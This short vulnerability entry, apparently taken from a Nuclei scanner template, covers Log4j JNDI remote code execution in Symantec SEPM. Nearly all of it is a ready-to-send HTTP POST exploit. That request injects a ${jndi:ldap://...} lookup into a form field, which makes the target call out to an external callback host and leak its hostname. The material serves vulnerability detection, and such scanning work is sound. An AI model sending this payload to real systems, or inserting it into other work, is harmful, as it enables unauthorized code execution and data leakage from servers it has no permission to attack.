# Vulnerability: Symantec SEPM - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`symantec-sepm-log4j-rce.yaml`)

## Description
Symantec SPEM is susceptible to Log4j JNDI remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /console/apps/sepm HTTP/1.1
Host: {{Hostname}}
Cookie: cookieTest=true;
Origin: {{RootURL}}
Referer: {{RootURL}}/console/apps/sepm
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

actionString=%2Fnoupdate%2FSEPMPasswordField_{{field}}%2F&storedActions%5B%5D=%2Ftype%2FSEPMPasswordField_{{field}}%2F${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&__Action=v4&__FastSubmit=true
```

